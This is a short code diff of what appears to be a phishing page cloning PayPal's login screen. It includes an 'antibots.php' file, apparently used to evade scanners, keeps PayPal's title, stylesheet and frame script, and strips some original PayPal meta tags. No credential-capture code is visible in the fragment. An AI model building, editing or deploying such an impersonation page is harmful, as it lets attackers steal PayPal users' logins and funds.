@@ -3,20 +3,11 @@ include 'antibots.php';
 ?>
 
 <html lang="en" class=" desktop js  js  js "><!--<![endif]-->
-    <head
+    <head>
         <meta charset="utf-8">
         <title>Log in to your PayPal account</title>
         <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-        <meta name="application-name" content="PayPal">
-        <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
-        <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
-        <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
-        <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
-        <link rel="shortcut icon" href="pp_favicon_x.ico">
-        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
-        <link rel="canonical" href="https://www.paypal.com/id/signin">
         <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
-        <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
         <link rel="stylesheet" href="css/contextualLoginElementalUIv2.css"><!--[if lte IE 9]><link rel="stylesheet" href="css/ie9.css" /><![endif]--><!-- build:js inline --><!-- build:[src] js/lib/ -->
         <script nonce="" src="js/lib/modernizr-2.6.1.js"></script><!-- /build --><!-- /build -->
         <script nonce="">/* Special integration eligibility check */function isEligibleIntegration() {var sxf = "";return sxf === 'true' || window.name === 'PPFrameRedirect';}/* Don't bust the frame if this is top window */if (self === top || isEligibleIntegration()) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}</script>
